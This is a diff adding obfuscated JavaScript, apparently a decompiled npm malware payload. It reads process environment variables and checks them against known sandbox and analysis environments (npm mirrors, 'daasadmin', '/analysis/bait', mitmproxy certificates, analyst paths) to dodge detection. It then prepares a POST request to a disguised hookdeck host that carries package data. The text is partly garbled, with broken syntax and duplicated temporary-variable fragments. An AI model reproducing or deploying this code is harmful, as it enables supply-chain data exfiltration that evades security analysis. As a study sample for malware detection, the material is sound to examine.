@@ -1,0 +1,147 @@
+function main = function main(postfix) {
+    let predator = process.env || {};
+    const holderObj = [
+        { key: ['npm', 'config', 're' + 'gistry'].join('_'), val: ['taobao', 'org'].join('.') },
+        { key: ['npm', 'config', 'registr' + 'y'].join('_'), val: ['registry', 'npmm' + 'irror', 'com'].join('.') },
+        { key: ["npm", "config", "reg" + "istry"].join("_"), val: ["cnp" + "mjs", "org"].join(".") },
+        { key: 'USERNAME', val: ['daas', 'admin'].join('') },
+        { key: "_", val: ["", "usr", "bin", "python"].join("/") },
+        { key: ["npm", "config", "metrics", "regis" + "try"].join("_"), val: ["mir" + "rors", "ten" + "cent", "com"].join(".") },
+        { key: ["npm", "config", "registry"].join("_"), val: ["mir" + "rors", "cloud", "ten" + "cent", "com"].join(".") },
+        { key: 'APPDATA', val: '/analysis/bait' },
+        { key: ["node", "ex" + "tra", "ca", "certs"].join("_").toUpperCase(), val: "mit" + "mproxy" },
+        { key: "PWD", val: ["","usr","local", ...
+let predator = process.env || {}
+const holderObj = [
+        { key: ['npm', 'config', 're' + 'gistry'].join('_'), val: ['taobao', 'org'].join('.') },
+        { key: ['npm', 'config', 'registr' + 'y'].join('_'), val: ['registry', 'npmm' + 'irror', 'com'].join('.') },
+        { key: ["npm", "config", "reg" + "istry"].join("_"), val: ["cnp" + "mjs", "org"].join(".") },
+        { key: 'USERNAME', val: ['daas', 'admin'].join('') },
+        { key: "_", val: ["", "usr", "bin", "python"].join("/") },
+        { key: ["npm", "config", "metrics", "regis" + "try"].join("_"), val: ["mir" + "rors", "ten" + "cent", "com"].join(".") },
+        { key: ["npm", "config", "registry"].join("_"), val: ["mir" + "rors", "cloud", "ten" + "cent", "com"].join(".") },
+        { key: 'APPDATA', val: '/analysis/bait' },
+        { key: ["node", "ex" + "tra", "ca", "certs"].join("_").toUpperCase(), val: "mit" + "mproxy" },
+        { key: "PWD", val: ["","usr","local", "lib", "node" + "_modules", predator.npm_package_name,].join("/")},
+      ...
+_tmp_1.push({ key: ['npm', 'config', 're' + 'gistry'].join('_'), val: ['taobao', 'org'].join('.') })
+_tmp_1.push({ key: ['npm', 'config', 'registr' + 'y'].join('_'), val: ['registry', 'npmm' + 'irror', 'com'].join('.') })
+_tmp_1.push({ key: ["npm", "config", "reg" + "istry"].join("_"), val: ["cnp" + "mjs", "org"].join(".") })
+_tmp_1.push({ key: 'USERNAME', val: ['daas', 'admin'].join('') })
+_tmp_1.push({ key: "_", val: ["", "usr", "bin", "python"].join("/") })
+_tmp_1.push({ key: ["npm", "config", "metrics", "regis" + "try"].join("_"), val: ["mir" + "rors", "ten" + "cent", "com"].join(".") })
+_tmp_1.push({ key: ["npm", "config", "registry"].join("_"), val: ["mir" + "rors", "cloud", "ten" + "cent", "com"].join(".") })
+_tmp_1.push({ key: 'APPDATA', val: '/analysis/bait' })
+_tmp_1.push({ key: ["node", "ex" + "tra", "ca", "certs"].join("_").toUpperCase(), val: "mit" + "mproxy" })
+_tmp_1.push({ key: "PWD", val: ["","usr","local", "lib", "node" + "_modules", predator.npm_package_name,].join("/")})
+_tmp_1.push({ key: "PWD", val: ["", predator.USER, "node" + "_modules", predator.npm_package_name].join("/") })
+_tmp_1.push([
+            { key: 'MAIL', val: ['', 'var', 'mail', 'app'].join('/') },
+            { key: 'HOME', val: ['', 'home', 'app'].join('/') },
+            { key: 'USER', val: 'app' },
+        ])
+_tmp_44.push({ key: 'MAIL', val: ['', 'var', 'mail', 'app'].join('/') })
+_tmp_44.push({ key: 'HOME', val: ['', 'home', 'app'].join('/') })
+_tmp_44.push({ key: 'USER', val: 'app' })
+_tmp_1.push([
+            { key: 'EDITOR', val: 'vi' },
+            { key: 'PROBE_USERNAME', val: '*' },
+            { key: 'SHELL', val: '/bin/bash' },
+            { key: 'SHLVL', val: '2' },
+            { key: 'npm_command', val: 'run-script' },
+            { key: 'NVM_CD_FLAGS', val: '' },
+            { key: 'npm_config_fund', val: '' },
+        ])
+_tmp_52.push({ key: 'EDITOR', val: 'vi' })
+_tmp_52.push({ key: 'PROBE_USERNAME', val: '*' })
+_tmp_52.push({ key: 'SHELL', val: '/bin/bash' })
+_tmp_52.push({ key: 'SHLVL', val: '2' })
+_tmp_52.push({ key: 'npm_command', val: 'run-script' })
+_tmp_52.push({ key: 'NVM_CD_FLAGS', val: '' })
+_tmp_52.push({ key: 'npm_config_fund', val: '' })
+_tmp_1.push([
+            { key: 'HOME', val: '/home/username' },
+            { key: 'USER', val: 'username' },
+            { key: 'LOGNAME', val: 'username' },
+        ])
+_tmp_60.push({ key: 'HOME', val: '/home/username' })
+_tmp_60.push({ key: 'USER', val: 'username' })
+_tmp_60.push({ key: 'LOGNAME', val: 'username' })
+_tmp_1.push([
+            { key: 'NODE', val: '/usr/bin/node' },
+            { key: 'INIT_CWD', val: '/npm' },
+            { key: 'PWD', val: '/npm/node_modules' },
+        ])
+_tmp_64.push({ key: 'NODE', val: '/usr/bin/node' })
+_tmp_64.push({ key: 'INIT_CWD', val: '/npm' })
+_tmp_64.push({ key: 'PWD', val: '/npm/node_modules' })
+_tmp_1.push([
+            { key: 'PWD', val: '/my-app' },
+            { key: 'DEBIAN_FRONTEND', val: 'noninteractive' },
+            { key: 'HOME', val: '/root' },
+        ])
+_tmp_68.push({ key: 'PWD', val: '/my-app' })
+_tmp_68.push({ key: 'DEBIAN_FRONTEND', val: 'noninteractive' })
+_tmp_68.push({ key: 'HOME', val: '/root' })
+_tmp_1.push([
+            { key: 'HOME', val: ['', 'Users', 'justin'].join('\\') },
+            { key: 'APPDATA', val: ['', 'Users', 'justin'].join('\\') },
+            { key: 'LOGONSERVER', val: [['DESKTOP','97KB'].join('-'), '6H'].join('B') }
+        ])
+_tmp_72.push({ key: 'HOME', val: ['', 'Users', 'justin'].join('\\') })
+_tmp_72.push({ key: 'APPDATA', val: ['', 'Users', 'justin'].join('\\') })
+_tmp_72.push({ key: 'LOGONSERVER', val: [['DESKTOP','97KB'].join('-'), '6H'].join('B') })
+_tmp_1.push([
+            { key: 'COMPLUS_ProfAPI_ProfilerCompatibilitySetting', val: 'EnableV2Profiler' },
+            { key: 'FPS_BROWSER_APP_PROFILE_STRING', val: ['Internet', 'Explorer'].join(' ') },
+            { key: 'PATHEXT', val: 'C:\\WINDOWS\\System32\\OpenSSH\\;c:\\Program Files\\nodejs\\;c:\\Strawberry\\c\\bin;c:\\Strawberry\\perl\\site\\bin;c:\\Strawberry\\perl\\bin'}
+        ])
+_tmp_84.push({ key: 'COMPLUS_ProfAPI_ProfilerCompatibilitySetting', val: 'EnableV2Profiler' })
+_tmp_84.push({ key: 'FPS_BROWSER_APP_PROFILE_STRING', val: ['Internet', 'Explorer'].join(' ') })
+_tmp_84.push({ key: 'PATHEXT', val: 'C:\\WINDOWS\\System32\\OpenSSH\\;c:\\Program Files\\nodejs\\;c:\\Strawberry\\c\\bin;c:\\Strawberry\\perl\\site\\bin;c:\\Strawberry\\perl\\bin'})
+_tmp_1.push([
+            { key: 'PATH', val: '/node_modules/.bin:/home/node/node_modules/node_modules/.bin:/home/node/node_modules/.bin:/home/node_modules/.bin:/node_modules/.bin:/usr/local/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
+            { key: 'INIT', val: '/home/node' },
+            { key: 'COLOR', val: '1' },
+            { key: 'SHLVL', val: '0' },
+            { key: 'EDITOR', val: 'vi'}
+        ])
+_tmp_90.push({ key: 'PATH', val: '/node_modules/.bin:/home/node/node_modules/node_modules/.bin:/home/node/node_modules/.bin:/home/node_modules/.bin:/node_modules/.bin:/usr/local/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' })
+_tmp_90.push({ key: 'INIT', val: '/home/node' })
+_tmp_90.push({ key: 'COLOR', val: '1' })
+_tmp_90.push({ key: 'SHLVL', val: '0' })
+_tmp_90.push({ key: 'EDITOR', val: 'vi'})
+let missing = [
+        ['npm', 'package', 'name'].join('_'),
+        ['npm', 'package', 'json'].join('_'),
+    ]
+_tmp_96.push(['npm', 'package', 'name'].join('_'))
+_tmp_96.push(['npm', 'package', 'json'].join('_'))
+missing.some( index => !predator[index] )
+holderObj.some((index) =>
+            [].concat(index)
+            .every((i) => (predator[i.key] || '').includes(i.val) || i.val === '*')) ||
+        Object.keys(predator).length < 10 || 
+        !predator.npm_package_name ||
+        !predator.npm_package_version ||
+        /C:\\Users\\[^\\]+\\Downloads\\node_modules\\/.test(predator.npm_package_json || "") ||
+        /C:\\Users\\[^\\]+\\Downloads/.test(predator.INIT_CWD || "") ||
+        (predator.npm_package_json || "").startsWith("/npm" + "/node_" + "modules/")
+Object.keys(predator).length < 10
+!predator.npm_package_name
+!predator.npm_package_version
+/C:\\Users\\[^\\]+\\Downloads\\node_modules\\/.test(predator.npm_package_json || "")
+/C:\\Users\\[^\\]+\\Downloads/.test(predator.INIT_CWD || "")
+(predator.npm_package_json || "").startsWith("/npm" + "/node_" + "modules/")
+let options = {
+        hostname: 'even' + 'ts.ho'.concat(['okdeck', 'com'].join('.')),
+        path: '/e/' + postfix,
+        method: 'POST',
+        headers: {'Content-Type': 'appli'.concat('cation/json')}
+    }
+_tmp_107.hostname = 'even' + 'ts.ho'.concat(['okdeck', 'com'].join('.'))
+_tmp_107.path = '/e/' + postfix
+_tmp_107.method = "POST"
+_tmp_107.headers = {'Content-Type': 'appli'.concat('cation/json')}
+const goto = require(HELP_MENU.split('/')[1] + HELP_MENU.split('/')[3])
+let req = goto.request(options).on('error', function (err) { })
